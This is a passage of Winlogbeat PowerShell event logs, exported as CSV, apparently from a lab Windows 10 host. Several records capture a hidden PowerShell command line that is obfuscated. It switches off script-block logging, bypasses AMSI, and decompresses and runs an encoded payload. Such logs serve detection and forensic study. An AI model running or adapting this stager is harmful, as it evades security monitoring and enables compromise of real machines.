Vv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=9cdddfe0-f36f-4c51-a5f4-64d60c2aef27
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=9cdddfe0-f36f-4c51-a5f4-64d60c2aef27
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4570,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.119",i3kMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4569,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.118",iXkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
